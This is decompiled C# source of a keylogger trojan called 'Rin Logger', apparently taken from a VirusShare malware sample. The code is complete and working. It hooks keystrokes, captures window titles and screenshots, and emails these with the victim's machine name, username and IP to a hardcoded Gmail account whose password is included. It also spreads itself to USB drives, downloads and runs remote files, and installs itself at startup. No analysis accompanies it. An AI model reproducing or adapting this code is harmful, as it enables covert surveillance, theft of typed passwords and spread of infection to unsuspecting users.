// Decompiled with JetBrains decompiler
// Type: RinLoggerServer.RinLogger
// Assembly: FalconBot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FC0A4D36-8302-4B94-AEDD-1F060B64CA11
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Spy.MSIL.KeyLogger.cts-4e3b75704a1bbf80bbb6945bbc162d99427f90d5f48c6d5976ac5b6951b410b6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace RinLoggerServer
{
  internal class RinLogger
  {
    [AccessedThroughProperty("Keylogger")]
    private static RinLogger.Keyboard _Keylogger;
    [AccessedThroughProperty("Clock")]
    private static System.Windows.Forms.Timer _Clock;
    internal static RinLogger.Gmail GmailService;
    internal static RinLogger.Mail MailService;
    internal static RinLogger.Log LogService;
    internal static RinLogger.Install InstallService;
    internal static RinLogger.Message MessageService;
    internal static RinLogger.RuntimeFunctions RuntimeService;
    internal static string Version;

    static RinLogger()
    {
      RinLogger.Keylogger = new RinLogger.Keyboard();
      RinLogger.Clock = new System.Windows.Forms.Timer();
      RinLogger.GmailService = new RinLogger.Gmail();
      RinLogger.MailService = new RinLogger.Mail();
      RinLogger.LogService = new RinLogger.Log();
      RinLogger.InstallService = new RinLogger.Install();
      RinLogger.MessageService = new RinLogger.Message();
      RinLogger.RuntimeService = new RinLogger.RuntimeFunctions();
      RinLogger.Version = "1.0";
    }

    internal static RinLogger.Keyboard Keylogger
    {
      get => RinLogger._Keylogger;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (RinLogger._Keylogger != null)
          RinLogger._Keylogger.Down -= new RinLogger.Keyboard.DownEventHandler(RinLogger.KeyloggerProcess);
        RinLogger._Keylogger = value;
        if (RinLogger._Keylogger == null)
          return;
        RinLogger._Keylogger.Down += new RinLogger.Keyboard.DownEventHandler(RinLogger.KeyloggerProcess);
      }
    }

    internal static System.Windows.Forms.Timer Clock
    {
      get => RinLogger._Clock;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (RinLogger._Clock != null)
          RinLogger._Clock.Tick -= new EventHandler(RinLogger.Clock_Tick);
        RinLogger._Clock = value;
        if (RinLogger._Clock == null)
          return;
        RinLogger._Clock.Tick += new EventHandler(RinLogger.Clock_Tick);
      }
    }

    [STAThread]
    public static void Main(string[] Arguments)
    {
      RinLogger.Keylogger.CreateHook();
      RinLogger.GmailService.Username = "chrispadada@gmail.com";
      RinLogger.GmailService.Password = "chriispada";
      RinLogger.GmailService.Smtp = "smtp.gmail.com";
      RinLogger.GmailService.Port = 587;
      RinLogger.GmailService.Recipient = "chrispadada@gmail.com";
      RinLogger.MailService.Colorize = true;
      RinLogger.MailService.Screenshot = true;
      RinLogger.MailService.Subject = "Rin Logger ::: {0} ({1})";
      RinLogger.MailService.ClipboardColor = "Purple";
      RinLogger.MailService.SpecialColor = "DeepSkyBlue";
      RinLogger.MailService.WindowColor = "DarkCyan";
      RinLogger.LogService.Tick = 120000;
      RinLogger.LogService.Clipboard = true;
      RinLogger.InstallService.Install = false;
      RinLogger.InstallService.InstallName = "";
      RinLogger.InstallService.Directory = Environment.SpecialFolder.Desktop;
      RinLogger.InstallService.Melt = false;
      RinLogger.InstallService.Mutex = "J4Q1NJJXs6dcd";
      RinLogger.InstallService.Filename = "";
      RinLogger.MessageService.Enable = false;
      RinLogger.MessageService.Once = true;
      RinLogger.MessageService.Title = "";
      RinLogger.MessageService.Message = "";
      RinLogger.MessageService.Style = MsgBoxStyle.OkOnly;
      RinLogger.RuntimeService.Downloader = new string[0];
      RinLogger.RuntimeService.USBSpread = true;
      RinLogger.RuntimeService.Webpages = new string[0];
      if (RinLogger.InstallService.Install)
      {
        if (Operators.CompareString(Application.StartupPath, Environment.GetFolderPath(RinLogger.InstallService.Directory), false) != 0)
        {
          Console.WriteLine("\r\nNot Installed!");
          if (RinLogger.MessageService.Enable)
          {
            int num = (int) Interaction.MsgBox((object) RinLogger.MessageService.Message, RinLogger.MessageService.Style, (object) RinLogger.MessageService.Title);
          }
          switch (RinLogger.InstallService.Melt)
          {
            case false:
              System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(RinLogger.InstallService.Directory) + "\\" + RinLogger.InstallService.Filename, true);
              RinHelper.RunAtStartup(RinLogger.InstallService.InstallName, Environment.GetFolderPath(RinLogger.InstallService.Directory) + "\\" + RinLogger.InstallService.Filename);
              Process.Start(Environment.GetFolderPath(RinLogger.InstallService.Directory) + "\\" + RinLogger.InstallService.Filename);
              ProjectData.EndApp();
              break;
            case true:
              RinHelper.RunAtStartup(RinLogger.InstallService.InstallName, Environment.GetFolderPath(RinLogger.InstallService.Directory) + "\\" + RinLogger.InstallService.Filename);
              RinHelper.MeltFile(Environment.GetFolderPath(RinLogger.InstallService.Directory) + "\\" + RinLogger.InstallService.Filename);
              break;
          }
        }
        else
        {
          Console.WriteLine("\r\nAlready Installed!");
          if (RinLogger.MessageService.Enable & !RinLogger.MessageService.Once)
          {
            int num = (int) Interaction.MsgBox((object) RinLogger.MessageService.Message, RinLogger.MessageService.Style, (object) RinLogger.MessageService.Title);
          }
        }
      }
      new Thread(new ThreadStart(RinLogger.MutexHandle)).Start();
      new Thread(new ThreadStart(RinLogger.Downloader)).Start();
      new Thread(new ThreadStart(RinLogger.USBSpreader)).Start();
      new Thread(new ThreadStart(RinLogger.WebpageViewers)).Start();
      RinLogger.Clock.Interval = RinLogger.LogService.Tick;
      RinLogger.Clock.Start();
      Application.Run();
    }

    public static void WebpageViewers()
    {
      if (RinLogger.RuntimeService.Webpages == null)
        return;
      string[] webpages = RinLogger.RuntimeService.Webpages;
      int index = 0;
      while (index < webpages.Length)
      {
        string fileName = webpages[index];
        try
        {
          Process.Start(fileName);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Console.WriteLine("\r\n" + ex.Message);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
    }

    public static void USBSpreader()
    {
      if (!RinLogger.RuntimeService.USBSpread)
        return;
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        try
        {
          System.IO.File.Copy(Application.ExecutablePath, driveInfo.Name + RinHelper.RandomMix(10, 20) + ".exe", true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Console.WriteLine("\r\n" + ex.Message);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
    }

    public static void Downloader()
    {
      if (RinLogger.RuntimeService.Downloader == null)
        return;
      WebClient webClient = new WebClient();
      string[] downloader = RinLogger.RuntimeService.Downloader;
      int index = 0;
      while (index < downloader.Length)
      {
        string address = downloader[index];
        string fileName = Path.GetTempPath() + "\\" + RinHelper.RandomMix(10, 20) + address.Substring(address.LastIndexOf("."));
        webClient.DownloadFile(address, fileName);
        Process.Start(fileName);
        checked { ++index; }
      }
    }

    public static void MutexHandle()
    {
      try
      {
        Thread.Sleep(5000);
        Mutex.OpenExisting(RinLogger.InstallService.Mutex);
        Console.WriteLine("Another instance is already running!");
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        RinLogger.InstallService.Store = new Mutex(false, RinLogger.InstallService.Mutex);
        ProjectData.ClearProjectError();
      }
    }

    public static void KeyloggerProcess(string Key)
    {
      string Window = "";
      if (RinHelper.GetActiveWindowTitle(ref Window))
      {
        RinLogger.LogService.Logs = RinLogger.LogService.Logs + "\r\n\r\n[Title: " + Window + " :]\r\n";
        Console.WriteLine("\r\n\r\n[Title: " + Window + " :]");
      }
      RinLogger.LogService.Logs += Key;
      Console.Write(Key);
    }

    public static void Clock_Tick(object sender, EventArgs e)
    {
      Console.WriteLine("\r\nClock Tick!");
      new RinLogger.ClockWorkerDelegate(RinLogger.ClockWorker).BeginInvoke(RinLogger.LogService.Logs, RinLogger.LogService.ClipboardLogs, new AsyncCallback(RinLogger.ClockWorkerCallback), (object) null);
      RinLogger.LogService.Logs = "";
      RinLogger.LogService.ClipboardLogs = "";
    }

    public static void ClockWorkerCallback(IAsyncResult Results) => ((RinLogger.ClockWorkerDelegate) ((AsyncResult) Results).AsyncDelegate).EndInvoke(Results);

    public static void ClockWorker(string CapturedLogs, string CapturedClipboard)
    {
      try
      {
        MailMessage message = new MailMessage();
        SmtpClient smtpClient1 = new SmtpClient();
        SmtpClient smtpClient2 = smtpClient1;
        smtpClient2.Credentials = (ICredentialsByHost) new NetworkCredential(RinLogger.GmailService.Username, RinLogger.GmailService.Password);
        smtpClient2.EnableSsl = true;
        smtpClient2.Host = RinLogger.GmailService.Smtp;
        smtpClient2.Port = RinLogger.GmailService.Port;
        MailMessage mailMessage = message;
        mailMessage.From = new MailAddress(RinLogger.GmailService.Username);
        mailMessage.To.Add(RinLogger.GmailService.Recipient);
        mailMessage.IsBodyHtml = RinLogger.MailService.Colorize;
        mailMessage.Subject = string.Format(RinLogger.MailService.Subject, (object) Environment.MachineName, (object) Environment.UserName);
        mailMessage.Body = !RinLogger.MailService.Colorize ? CapturedLogs + CapturedClipboard : RinLogger.FormatLogs(CapturedLogs + CapturedClipboard);
        mailMessage.Body = RinLogger.GetDetails(RinLogger.MailService.Colorize) + mailMessage.Body;
        if (RinLogger.MailService.Screenshot)
        {
          ScreenCapture.CurrentScreen();
          string str = Path.GetTempPath() + RinHelper.RandomMix(10, 20) + ".png";
          ScreenCapture.oBitMap.Save(str);
          mailMessage.Attachments.Add(new Attachment(str));
        }
        smtpClient1.Send(message);
        Console.WriteLine("\r\nLogs Sent!");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Console.WriteLine("\r\nException Occured: " + ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public static string FormatLogs(string Data)
    {
      Data = Data.Replace("\r\n", "<br />");
      Data = Data.Replace("[Title: ", "<b>[Title:</b> <font color=\"" + RinLogger.MailService.WindowColor + "\">");
      Data = Data.Replace(" :]<br />", "</font> <b>:]</b><br />");
      Data = Data.Replace("[Clipboard Entry ", "<b>[Clipboard Entry</b> <font color=\"" + RinLogger.MailService.ClipboardColor + "\">");
      Data = Data.Replace(" ::.]<br />", "</font> <b>::.]</b><br />");
      MatchCollection matchCollection = new Regex("\\[.{1,20}?]").Matches(Data);
      try
      {
        foreach (Match match in matchCollection)
        {
          if (!match.ToString().Contains("Title:"))
            Data = Data.Replace(match.ToString(), "<font color=\"" + RinLogger.MailService.SpecialColor + "\">" + match.ToString() + "</font>");
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return Data;
    }

    public static string GetDetails(bool Html)
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      string str1 = "LightSteelBlue";
      string str2 = "SteelBlue";
      StringBuilder stringBuilder2 = stringBuilder1;
      switch (Html)
      {
        case false:
          stringBuilder2.AppendLine("Rin Logger");
          stringBuilder2.AppendLine(string.Format("Machine Name: {0}", (object) Environment.MachineName));
          stringBuilder2.AppendLine(string.Format("Username: {0}", (object) Environment.UserName));
          stringBuilder2.AppendLine(string.Format("IP Address: {0}", (object) RinHelper.GetExternalIP()));
          stringBuilder2.AppendLine(string.Format("OS Product Name: {0}", (object) new ComputerInfo().OSFullName));
          stringBuilder2.AppendLine(string.Format("OS Full RAM: {0} {2}", (object) ((double) new ComputerInfo().TotalPhysicalMemory / 1000000.0), (object) "MB"));
          stringBuilder2.AppendLine(string.Format("Rin Logger Version: {0}", (object) RinLogger.Version));
          break;
        case true:
          stringBuilder2.Append("<center><strong><b><font size=14 color=\"" + str1 + "\">Rin Logger</font></b></strong></center><br />");
          stringBuilder2.Append(string.Format("<font color=\"" + str2 + "\">Machine Name:</font> {0}", (object) Environment.MachineName) + "<br />");
          stringBuilder2.Append(string.Format("<font color=\"" + str2 + "\">Username:</font> {0}", (object) Environment.UserName) + "<br />");
          stringBuilder2.Append(string.Format("<font color=\"" + str2 + "\">IP Address:</font> {0}", (object) RinHelper.GetExternalIP()) + "<br />");
          stringBuilder2.Append(string.Format("<font color=\"" + str2 + "\">OS Product Name:</font> {0}", (object) new ComputerInfo().OSFullName) + "<br />");
          stringBuilder2.Append(string.Format("<font color=\"" + str2 + "\">OS Full RAM:</font> {0}", (object) ((double) new ComputerInfo().TotalPhysicalMemory / 1000000.0), (object) "MB<br />"));
          break;
      }
      return stringBuilder1.ToString();
    }

    public class Keyboard
    {
      private static int Key;
      private static RinLogger.Keyboard.KDel KHD;

      public event RinLogger.Keyboard.DownEventHandler Down;

      public event RinLogger.Keyboard.UpEventHandler Up;

      public void CreateHook()
      {
        RinLogger.Keyboard.KHD = new RinLogger.Keyboard.KDel(this.Proc);
        RinLogger.Keyboard.Key = this.CreateAPI<RinLogger.Keyboard.SetWindowsHookEx>("user32:SetWindowsHookExA")(13, RinLogger.Keyboard.KHD, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

      [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

      private T CreateAPI<T>(string Name) => (T) Marshal.GetDelegateForFunctionPointer(RinLogger.Keyboard.GetProcAddress(RinLogger.Keyboard.LoadLibraryA(ref Name.Split(':')[0]), ref Name.Split(':')[1]), typeof (T));

      private int Proc(int Code, int wParam, ref RinLogger.Keyboard.KeyStructure lParam)
      {
        if (Code == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              RinLogger.Keyboard.DownEventHandler downEvent = this.DownEvent;
              if (downEvent != null)
              {
                downEvent(this.Feed((Keys) lParam.Code));
                break;
              }
              break;
            case 257:
            case 261:
              RinLogger.Keyboard.UpEventHandler upEvent = this.UpEvent;
              if (upEvent != null)
              {
                upEvent(this.Feed((Keys) lParam.Code));
                break;
              }
              break;
          }
        }
        return this.CreateAPI<RinLogger.Keyboard.CallNextHookEx>("user32:CallNextHookEx")(RinLogger.Keyboard.Key, Code, wParam, ref lParam);
      }

      public void DiposeHook()
      {
        int num = this.CreateAPI<RinLogger.Keyboard.UnhookWindowsHookEx>("user32:UnhookWindowsHookEx")(RinLogger.Keyboard.Key);
        // ISSUE: explicit finalizer call
        this.Finalize();
      }

      private string Feed(Keys e)
      {
        Keys keys = e;
        if (keys >= Keys.A && keys <= Keys.Z)
          return Control.IsKeyLocked(Keys.Capital) | (Control.ModifierKeys & Keys.Shift) != Keys.None ? e.ToString() : e.ToString().ToLower();
        if (keys >= Keys.D0 && keys <= Keys.D9)
        {
          if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
            return e.ToString().Replace("D", (string) null);
          string Left = e.ToString();
          if (Operators.CompareString(Left, "D1", false) == 0)
            return "!";
          if (Operators.CompareString(Left, "D2", false) == 0)
            return "@";
          if (Operators.CompareString(Left, "D3", false) == 0)
            return "#";
          if (Operators.CompareString(Left, "D4", false) == 0)
            return "$";
          if (Operators.CompareString(Left, "D5", false) == 0)
            return "%";
          if (Operators.CompareString(Left, "D6", false) == 0)
            return "^";
          if (Operators.CompareString(Left, "D7", false) == 0)
            return "&";
          if (Operators.CompareString(Left, "D8", false) == 0)
            return "*";
          if (Operators.CompareString(Left, "D9", false) == 0)
            return "(";
          if (Operators.CompareString(Left, "D0", false) == 0)
            return ")";
        }
        else
        {
          if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
            return e.ToString().Replace("NumPad", (string) null);
          if (keys >= Keys.Multiply && keys <= Keys.Divide)
          {
            string Left = e.ToString();
            if (Operators.CompareString(Left, "Divide", false) == 0)
              return "/";
            if (Operators.CompareString(Left, "Multiply", false) == 0)
              return "*";
            if (Operators.CompareString(Left, "Subtract", false) == 0)
              return "-";
            if (Operators.CompareString(Left, "Add", false) == 0)
              return "+";
            if (Operators.CompareString(Left, "Decimal", false) == 0)
              return ".";
          }
          else
          {
            if (keys == Keys.Space)
              return " ";
            if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
            {
              if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
              {
                string Left = e.ToString();
                if (Operators.CompareString(Left, "OemMinus", false) == 0)
                  return "_";
                if (Operators.CompareString(Left, "Oemplus", false) == 0)
                  return "+";
                if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
                  return "{";
                if (Operators.CompareString(Left, "Oem6", false) == 0)
                  return "}";
                if (Operators.CompareString(Left, "Oem5", false) == 0)
                  return "|";
                if (Operators.CompareString(Left, "Oem1", false) == 0)
                  return ":";
                if (Operators.CompareString(Left, "Oem7", false) == 0)
                  return "\"";
                if (Operators.CompareString(Left, "Oemcomma", false) == 0)
                  return "<";
                if (Operators.CompareString(Left, "OemPeriod", false) == 0)
                  return ">";
                if (Operators.CompareString(Left, "OemQuestion", false) == 0)
                  return "?";
                if (Operators.CompareString(Left, "Oemtilde", false) == 0)
                  return "~";
              }
              else
              {
                string Left = e.ToString();
                if (Operators.CompareString(Left, "OemMinus", false) == 0)
                  return "-";
                if (Operators.CompareString(Left, "Oemplus", false) == 0)
                  return "=";
                if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
                  return "[";
                if (Operators.CompareString(Left, "Oem6", false) == 0)
                  return "]";
                if (Operators.CompareString(Left, "Oem5", false) == 0)
                  return "\\";
                if (Operators.CompareString(Left, "Oem1", false) == 0)
                  return ";";
                if (Operators.CompareString(Left, "Oem7", false) == 0)
                  return "'";
                if (Operators.CompareString(Left, "Oemcomma", false) == 0)
                  return ",";
                if (Operators.CompareString(Left, "OemPeriod", false) == 0)
                  return ".";
                if (Operators.CompareString(Left, "OemQuestion", false) == 0)
                  return "/";
                if (Operators.CompareString(Left, "Oemtilde", false) == 0)
                  return "`";
              }
            }
            else
              return keys == Keys.Return ? Environment.NewLine : "[" + e.ToString() + "]";
          }
        }
        return (string) null;
      }

      private delegate int SetWindowsHookEx(
        int Hook,
        RinLogger.Keyboard.KDel KeyDelegate,
        int HMod,
        int ThreadId);

      private delegate int CallNextHookEx(
        int Hook,
        int nCode,
        int wParam,
        ref RinLogger.Keyboard.KeyStructure lParam);

      private delegate int UnhookWindowsHookEx(int Hook);

      private delegate int KDel(int nCode, int wParam, ref RinLogger.Keyboard.KeyStructure lParam);

      public delegate void DownEventHandler(string Key);

      public delegate void UpEventHandler(string Key);

      private struct KeyStructure
      {
        public int Code;
        public int ScanCode;
        public int Flags;
        public int Time;
        public int ExtraInfo;
      }
    }

    public struct Gmail
    {
      public string Username;
      public string Password;
      public string Smtp;
      public int Port;
      public string Recipient;
    }

    public struct Mail
    {
      public string Subject;
      public bool Colorize;
      public string ClipboardColor;
      public string SpecialColor;
      public string WindowColor;
      public bool Screenshot;
    }

    public struct Log
    {
      public int Tick;
      public bool Clipboard;
      public string ClipboardLogs;
      public string Logs;
    }

    public struct Install
    {
      public bool Install;
      public string InstallName;
      public Environment.SpecialFolder Directory;
      public string Filename;
      public string Mutex;
      public Mutex Store;
      public bool Melt;
    }

    public struct Message
    {
      public bool Enable;
      public bool Once;
      public string Title;
      public string Message;
      public MsgBoxStyle Style;
    }

    public struct RuntimeFunctions
    {
      public string[] Downloader;
      public bool USBSpread;
      public string[] Webpages;
    }

    public delegate void ClockWorkerDelegate(string CapturedLogs, string CapturedClipboard);
  }
}
